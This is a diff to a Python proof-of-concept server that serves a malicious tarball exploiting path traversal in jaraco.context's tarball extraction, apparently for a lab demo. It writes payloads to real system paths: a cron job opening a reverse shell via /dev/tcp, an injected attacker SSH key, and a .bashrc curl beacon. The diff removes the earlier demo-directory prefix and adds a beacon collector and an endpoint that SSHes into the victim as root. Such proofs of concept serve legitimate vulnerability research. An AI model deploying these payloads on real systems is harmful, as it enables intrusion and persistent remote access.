@@ -20,38 +20,38 @@ import sys
 import tarfile
 
 PORT = int(os.environ.get('PORT', 8080))
-DEMO_PREFIX = os.environ.get('DEMO_PREFIX', '/tmp/demo')
 
-# SSH key handling
+# SSH key handling (same as package_index server)
 SSH_KEY_DIR = "/root/.ssh"
 SSH_PRIVATE_KEY = f"{SSH_KEY_DIR}/attacker_key"
 SSH_PUBLIC_KEY = f"{SSH_KEY_DIR}/attacker_key.pub"
 ATTACKER_PUBLIC_KEY = ""
 
 ACTIVE_SCENARIO = os.environ.get('SCENARIO', 'cron')
+BEACONS_RECEIVED = []
 
 
 def get_scenarios():
     """Return attack scenarios with payloads - same as package_index attack."""
     return {
         "cron": {
-            "target": f"{DEMO_PREFIX}/etc/cron.d/backdoor",
+            "target": "/etc/cron.d/backdoor",
             "payload": b"""# Malicious cron job - reverse shell every minute
-* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/server/4444 0>&1'
 """,
             "description": "Cron job for persistent reverse shell",
         },
         "ssh": {
-            "target": f"{DEMO_PREFIX}/root/.ssh/authorized_keys",
+            "target": "/root/.ssh/authorized_keys",
             "payload": f"""# Attacker's SSH key for persistent access
 {ATTACKER_PUBLIC_KEY}
 """.encode() if ATTACKER_PUBLIC_KEY else b"ssh-ed25519 AAAA... attacker@evil\n",
             "description": "SSH key injection for persistent access",
         },
         "bashrc": {
-            "target": f"{DEMO_PREFIX}/home/victim/.bashrc",
+            "target": "/home/victim/.bashrc",
             "payload": b"""# Backdoored .bashrc
-curl -s http://attacker:8080/beacon?h=$(hostname) &>/dev/null &
+curl -s http://server:8080/beacon?h=$(hostname) &>/dev/null &
 echo "[BACKDOOR] Beacon sent to attacker"
 """,
             "description": "Shell profile backdoor",
@@ -75,7 +75,7 @@ def generate_ssh_keypair():
             ATTACKER_PUBLIC_KEY = f.read().strip()
         print(f"[SERVER] SSH key: {ATTACKER_PUBLIC_KEY[:50]}...")
     except Exception as e:
-        print(f"[SERVER] SSH keygen skipped: {e}")
+        print(f"[SERVER] SSH keygen failed: {e}")
         ATTACKER_PUBLIC_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@evil"
 
 
@@ -114,6 +114,9 @@ class TarballHandler(http.server.BaseHTTPRequestHandler):
 
     def do_GET(self):
         path = self.path.split('?')[0].split('#')[0]
+        query = ""
+        if '?' in self.path:
+            query = self.path.split('?', 1)[1].split('#')[0]
 
         if path == '/status' or path == '/':
             self.serve_status()
@@ -121,6 +124,10 @@ class TarballHandler(http.server.BaseHTTPRequestHandler):
             self.set_scenario(path)
         elif path.endswith('.tar.gz') or path == '/tarball':
             self.serve_malicious_tarball()
+        elif path == '/validate/ssh':
+            self.validate_ssh()
+        elif path == '/beacon':
+            self.handle_beacon(query)
         else:
             self.send_error(404)
 
@@ -144,6 +151,14 @@ class TarballHandler(http.server.BaseHTTPRequestHandler):
 {"".join(f'<li><a href="/scenario/{name}">{name}</a>: {s["description"]}</li>' for name, s in scenarios.items())}
 </ul>
 
+<h3>Validation</h3>
+<ul>
+<li><a href="/validate/ssh">Validate SSH Access</a></li>
+</ul>
+
+<h3>Beacons Received: {len(BEACONS_RECEIVED)}</h3>
+<ul>{"".join(f"<li>{b}</li>" for b in BEACONS_RECEIVED[-10:])}</ul>
+
 <h3>Download Malicious Tarball</h3>
 <p><a href="/package.tar.gz">package.tar.gz</a></p>
 
@@ -159,17 +174,6 @@ strip_first_component() does:
 
 File written to: {scenario["target"]}
 Instead of:      target_dir{scenario["target"]}
-</pre>
-
-<h3>Victim Code</h3>
-<pre>
-from jaraco.context import tarball
-
-# Victim expects files in /safe/directory
-with tarball("http://attacker:8080/package.tar.gz", target_dir="/safe/directory"):
-    pass
-
-# But file is actually written to {scenario["target"]}!
 </pre>
 </body>
 </html>"""
@@ -211,6 +215,39 @@ with tarball("http://attacker:8080/package.tar.gz", target_dir="/safe/directory"
 
         print(f"[ATTACK] Served malicious tarball ({len(tarball_data)} bytes)")
 
+    def validate_ssh(self):
+        """SSH into the victim container to prove we have access."""
+        print("[SERVER] Validating SSH access to victim...")
+        try:
+            result = subprocess.run([
+                "ssh", "-i", SSH_PRIVATE_KEY,
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "UserKnownHostsFile=/dev/null",
+                "-o", "ConnectTimeout=5",
+                "root@client",
+                "echo SSH_OK; id; hostname"
+            ], capture_output=True, text=True, timeout=10)
+
+            if "SSH_OK" in result.stdout:
+                print(f"[SSH SUCCESS]\n{result.stdout}")
+                self.send_html(f"<h1>SSH ACCESS CONFIRMED</h1><pre>{result.stdout}</pre>")
+            else:
+                print(f"[SSH FAILED] {result.stderr}")
+                self.send_html(f"<h1>SSH Failed</h1><pre>{result.stderr}</pre>", 500)
+        except Exception as e:
+            print(f"[SSH ERROR] {e}")
+            self.send_html(f"<h1>Error</h1><pre>{e}</pre>", 500)
+
+    def handle_beacon(self, query):
+        from urllib.parse import parse_qs
+        import time
+        params = parse_qs(query)
+        host = params.get('h', ['unknown'])[0]
+        BEACONS_RECEIVED.append(f"{time.strftime('%H:%M:%S')} - {host}")
+        print(f"[BEACON] Received from: {host}")
+        self.send_response(200)
+        self.end_headers()
+
     def send_html(self, content, code=200):
         data = content.encode()
         self.send_response(code)
@@ -229,12 +266,12 @@ def main():
     print("=" * 70)
     print()
     print(f"Listening on port {PORT}")
-    print(f"Demo prefix: {DEMO_PREFIX}")
     print(f"Active scenario: {ACTIVE_SCENARIO}")
     print()
     print("Endpoints:")
     print(f"  http://0.0.0.0:{PORT}/              - Status page")
     print(f"  http://0.0.0.0:{PORT}/package.tar.gz - Malicious tarball")
+    print(f"  http://0.0.0.0:{PORT}/validate/ssh   - Validate SSH access to victim")
     print(f"  http://0.0.0.0:{PORT}/scenario/cron  - Switch to cron scenario")
     print(f"  http://0.0.0.0:{PORT}/scenario/ssh   - Switch to SSH scenario")
     print(f"  http://0.0.0.0:{PORT}/scenario/bashrc - Switch to bashrc scenario")
